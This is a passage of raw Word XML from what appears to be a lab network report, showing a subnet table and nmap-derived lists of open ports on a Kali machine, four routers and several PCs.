          <w:p w14:paraId="1197A628" w14:textId="4FEE2FF8" w:rsidR="008F02E6" w:rsidRPr="00521489" w:rsidRDefault="002B2BE5" w:rsidP="008F02E6">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>13.13.13.0/24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1420" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="01CE0928" w14:textId="69FE6C60" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="002B2BE5" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1274" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5841E59F" w14:textId="186945BC" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="002B2BE5" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>13.13.13.1-254</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1842" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7312F767" w14:textId="04B21D9B" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="002B2BE5" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>254</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1418" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A7DECD1" w14:textId="77777777" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="002B2BE5" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>13.13.13.12</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39AA17D0" w14:textId="64850801" w:rsidR="002B2BE5" w:rsidRPr="00521489" w:rsidRDefault="002B2BE5" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>13.13.13.13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1700" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4D6067E5" w14:textId="7744D24C" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="002B2BE5" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>13.13.13.255</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="16921A9F" w14:textId="6C995FDB" w:rsidR="00E54A30" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="004B323B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc183984550"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Host Information</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="2690C6C4" w14:textId="49B2B4C9" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00EF4289">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">A list below of all hosts and their known open ports. Any unknown ports that were found were omitted from the list.  These ports were found using nmap scans on each of the host IP addresses. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="456F6D33" w14:textId="5A758E2A" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Kali</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308B4DA4" w14:textId="690343B0" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open Ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE9E89D" w14:textId="16D1BBCB" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>22 – SSH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773BA8E9" w14:textId="7B5A4D92" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">1111 </w:t>
      </w:r>
      <w:r w:rsidR="005C6DD2" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005C6DD2" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18581758" w14:textId="0CCFE2DB" w:rsidR="005C6DD2" w:rsidRPr="00521489" w:rsidRDefault="005C6DD2" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3389 – web server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414E77ED" w14:textId="31F6947C" w:rsidR="005C6DD2" w:rsidRPr="00521489" w:rsidRDefault="005C6DD2" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5000 – upnp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E2BB10" w14:textId="77777777" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Router 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE381A2" w14:textId="26BA27A7" w:rsidR="005C6DD2" w:rsidRPr="00521489" w:rsidRDefault="005C6DD2" w:rsidP="005C6DD2">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05951D3B" w14:textId="01BC318C" w:rsidR="005C6DD2" w:rsidRPr="00521489" w:rsidRDefault="00071A4D" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>22 – SSH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74062901" w14:textId="4D81769C" w:rsidR="00071A4D" w:rsidRPr="00521489" w:rsidRDefault="00071A4D" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>23 – telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E90F38" w14:textId="1FB31335" w:rsidR="00071A4D" w:rsidRPr="00521489" w:rsidRDefault="00071A4D" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>80 – http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DFB9F4" w14:textId="386BDD18" w:rsidR="00071A4D" w:rsidRPr="00521489" w:rsidRDefault="00071A4D" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>443 – https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7CEC9A" w14:textId="0BB0D3BB" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Router 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557FAF5D" w14:textId="77777777" w:rsidR="00071A4D" w:rsidRPr="00521489" w:rsidRDefault="00071A4D" w:rsidP="00071A4D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6684EB06" w14:textId="77777777" w:rsidR="00071A4D" w:rsidRPr="00521489" w:rsidRDefault="00071A4D" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>23 – telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14392AB6" w14:textId="77777777" w:rsidR="00071A4D" w:rsidRPr="00521489" w:rsidRDefault="00071A4D" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>80 – http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70284050" w14:textId="77777777" w:rsidR="00071A4D" w:rsidRPr="00521489" w:rsidRDefault="00071A4D" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>443 – https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276F4D6B" w14:textId="2AFA6DD1" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Router 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39709FAF" w14:textId="77777777" w:rsidR="00071A4D" w:rsidRPr="00521489" w:rsidRDefault="00071A4D" w:rsidP="00071A4D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30AAC34F" w14:textId="77777777" w:rsidR="00071A4D" w:rsidRPr="00521489" w:rsidRDefault="00071A4D" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>23 – telnet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22137329" w14:textId="77777777" w:rsidR="00071A4D" w:rsidRPr="00521489" w:rsidRDefault="00071A4D" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>80 – http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E878D6" w14:textId="209098AC" w:rsidR="00071A4D" w:rsidRPr="00521489" w:rsidRDefault="00071A4D" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>443 – https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E55A181" w14:textId="7C9F25A6" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Router 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23755DCE" w14:textId="77777777" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00EF4289">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA37968" w14:textId="75729C34" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>None.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13607A1A" w14:textId="18076557" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>PC1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477203E0" w14:textId="77777777" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00EF4289">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0B7087" w14:textId="5C66F873" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>22 – SSH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA1F748" w14:textId="77D4C3A2" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>111 – rpcbind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B59466F" w14:textId="7F7C9232" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2049 – NFS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5F5CF9" w14:textId="4E2A165D" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>PC2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B370548" w14:textId="2C6892FA" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00EF4289">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E18632" w14:textId="2E0CFA28" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>22 – SSH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25643B15" w14:textId="5F5C8626" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>111 – rpcbind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C4F95C" w14:textId="6259D7ED" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2049 – NFS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6FB23F" w14:textId="215AD8B0" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>PC3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C67EFA" w14:textId="188EDF67" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00EF4289">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48AD6C8C" w14:textId="371F67E8" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>22 - SSH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51180CB5" w14:textId="1C5B5550" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>PC4</w:t>
      </w:r>
    </w:p>
